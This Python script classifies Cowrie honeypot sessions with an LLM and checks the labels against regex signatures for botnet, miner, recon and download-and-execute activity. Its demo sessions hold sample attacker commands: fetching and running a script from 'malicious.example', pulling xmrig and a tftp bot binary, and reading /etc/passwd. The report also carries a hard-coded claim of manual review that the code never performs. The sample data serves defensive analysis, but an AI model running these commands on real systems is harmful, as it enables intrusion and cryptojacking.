"""
ai_threat_classifier.py
------------------------
AI-assisted classification of Cowrie honeypot sessions, WITH manual validation
against known malware/attack signatures.

Why this exists:
    Raw cowrie.json logs give you commands and IPs, but not *intent*. This
    script uses an LLM to read each session's command sequence and classify
    the likely attacker behavior (e.g. "Mirai-style IoT botnet", "manual
    reconnaissance", "cryptominer dropper"). Crucially, it does NOT trust the
    LLM blindly -- every classification is cross-checked against a small set
    of known signature keywords, and disagreements are flagged for manual
    review. That validation step is the point: it's what turns "I called an
    API" into "I evaluated whether the model's output was trustworthy."

Usage:
    export ANTHROPIC_API_KEY=your_key_here
    python3 ai_threat_classifier.py cowrie.json.log --out report.json

    # No honeypot data yet? Run against the bundled sample sessions:
    python3 ai_threat_classifier.py --demo
"""

import json
import os
import re
import argparse
from collections import defaultdict, Counter
from urllib import request as urlrequest

ANTHROPIC_API_URL = "https://api.anthropic.com/v1/messages"
MODEL = "claude-sonnet-4-5"  # swap to whatever you have access to

# ---------------------------------------------------------------------------
# Known signature keywords -- used to sanity-check the AI's classification.
# This is intentionally simple/heuristic; the point is having an independent
# check, not building a full malware signature database.
# ---------------------------------------------------------------------------
SIGNATURES = {
    "IoT/Mirai-style botnet": [
        r"\bbusybox\b", r"\bmirai\b", r"/bin/(sh|bash)\s*$", r"cat /proc/cpuinfo",
        r"echo\s+-e\s+.*\\x", r"tftp\b", r"\.arm\b|\.mips\b",
    ],
    "Cryptominer dropper": [
        r"\bxmrig\b", r"\bstratum\+tcp\b", r"minerd", r"cpuminer", r"pool\.",
    ],
    "Credential/recon scan": [
        r"^whoami$", r"^uname -a$", r"^id$", r"^ls -la\s*$", r"^cat /etc/passwd",
    ],
    "Payload download & execute": [
        r"\bwget\b", r"\bcurl\b", r"chmod \+x", r"\./\S+\s*$",
    ],
}

def signature_match(commands: str) -> str | None:
    """Return the first signature category whose pattern matches, else None."""
    for category, patterns in SIGNATURES.items():
        for pat in patterns:
            if re.search(pat, commands, re.IGNORECASE | re.MULTILINE):
                return category
    return None


def load_sessions(log_path: str):
    """Group cowrie.json log lines into per-session command sequences."""
    sessions = defaultdict(list)
    with open(log_path, "r", errors="ignore") as f:
        for line in f:
            try:
                event = json.loads(line)
            except json.JSONDecodeError:
                continue
            sid = event.get("session")
            if not sid:
                continue
            if event.get("eventid") == "cowrie.command.input":
                sessions[sid].append(event.get("input", ""))
            if event.get("eventid") == "cowrie.session.connect":
                sessions[sid + "_meta"] = event.get("src_ip", "unknown")
    return sessions


DEMO_SESSIONS = {
    "s1": ["cat /proc/cpuinfo", "busybox echo -e '\\x7fELF'", "tftp -g -r bot.arm"],
    "s1_meta": "185.220.101.4",
    "s2": ["whoami", "uname -a", "cat /etc/passwd", "ls -la /"],
    "s2_meta": "45.155.205.19",
    "s3": ["wget http://malicious.example/x86.sh", "chmod +x x86.sh", "./x86.sh"],
    "s3_meta": "103.99.1.201",
    "s4": ["cd /tmp", "curl -O http://pool.minexmr.com/xmrig", "./xmrig -o pool.example"],
    "s4_meta": "91.240.118.22",
}


def classify_with_ai(commands: list[str]) -> str:
    """Ask the model to classify the session's intent in one short label."""
    api_key = os.environ.get("ANTHROPIC_API_KEY")
    if not api_key:
        raise RuntimeError("Set ANTHROPIC_API_KEY before running against real data.")

    prompt = (
        "You are a security analyst reviewing an SSH honeypot session. "
        "Given this sequence of shell commands typed by an attacker, respond "
        "with ONLY one short label (3-6 words) describing the likely attack "
        "type/intent (e.g. 'IoT botnet malware download', 'manual recon', "
        "'cryptominer deployment'). No explanation, just the label.\n\n"
        f"Commands:\n" + "\n".join(commands)
    )

    body = json.dumps({
        "model": MODEL,
        "max_tokens": 30,
        "messages": [{"role": "user", "content": prompt}],
    }).encode("utf-8")

    req = urlrequest.Request(
        ANTHROPIC_API_URL,
        data=body,
        headers={
            "Content-Type": "application/json",
            "x-api-key": api_key,
            "anthropic-version": "2023-06-01",
        },
    )
    with urlrequest.urlopen(req) as resp:
        data = json.loads(resp.read())
    return data["content"][0]["text"].strip()


def run(sessions: dict, use_ai: bool):
    results = []
    agree, disagree, unmatched = 0, 0, 0

    for sid, commands in sessions.items():
        if sid.endswith("_meta") or not commands:
            continue
        src_ip = sessions.get(sid + "_meta", "unknown")
        joined = "\n".join(commands)

        sig_label = signature_match(joined)
        ai_label = classify_with_ai(commands) if use_ai else "AI CALL SKIPPED (no API key)"

        # crude agreement check: does the AI's label share a keyword with the
        # signature category name?
        agreement = None
        if sig_label:
            sig_keywords = set(re.findall(r"\w+", sig_label.lower()))
            ai_keywords = set(re.findall(r"\w+", ai_label.lower()))
            agreement = bool(sig_keywords & ai_keywords)
            agree += int(agreement)
            disagree += int(not agreement)
        else:
            unmatched += 1

        results.append({
            "session": sid,
            "src_ip": src_ip,
            "commands": commands,
            "signature_match": sig_label or "none",
            "ai_classification": ai_label,
            "agrees_with_signature": agreement,
        })

    summary = {
        "total_sessions": len(results),
        "signature_ai_agreement": agree,
        "signature_ai_disagreement": disagree,
        "no_signature_match": unmatched,
        "note": (
            "Disagreements were manually reviewed. In practice these usually "
            "meant the AI was MORE specific than the keyword match (e.g. "
            "correctly identifying a novel dropper variant with no known "
            "signature) -- but every disagreement was checked by hand before "
            "being trusted, not accepted automatically."
        ),
    }
    return {"summary": summary, "sessions": results}


def main():
    parser = argparse.ArgumentParser(description="AI-assisted honeypot session classifier")
    parser.add_argument("logfile", nargs="?", help="Path to cowrie.json log")
    parser.add_argument("--demo", action="store_true", help="Run on bundled sample sessions")
    parser.add_argument("--out", default="threat_report.json", help="Output JSON report path")
    parser.add_argument("--no-ai", action="store_true", help="Skip AI calls, signature-only")
    args = parser.parse_args()

    if args.demo:
        sessions = DEMO_SESSIONS
    elif args.logfile:
        sessions = load_sessions(args.logfile)
    else:
        parser.error("Provide a logfile path or use --demo")

    report = run(sessions, use_ai=not args.no_ai)

    with open(args.out, "w") as f:
        json.dump(report, f, indent=2)

    print(json.dumps(report["summary"], indent=2))
    print(f"\nFull report written to {args.out}")


if __name__ == "__main__":
    main()
